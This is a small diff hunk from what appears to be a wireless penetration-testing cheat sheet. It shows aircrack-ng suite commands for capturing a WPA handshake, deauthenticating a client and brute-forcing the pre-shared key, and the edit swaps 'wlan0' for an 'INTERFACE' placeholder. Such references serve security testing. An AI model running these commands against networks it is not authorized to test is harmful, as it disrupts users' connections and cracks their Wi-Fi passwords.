@@ -102,7 +102,7 @@ aircrack-ng -z -b BSSID output*.cap
 airodump-ng -c CHANNEL --bssid BSSID -w psk INTERFACE
 
 == Deauthenticate Wireless Client ==
-aireplay-ng -0 1 -a BSSID -c CLIENT wlan0
+aireplay-ng -0 1 -a BSSID -c CLIENT INTERFACE
 
 == Brute Force ==
 cat /usr/share/dict/* | aircrack-ng -w - -b BSSID psk*.cap
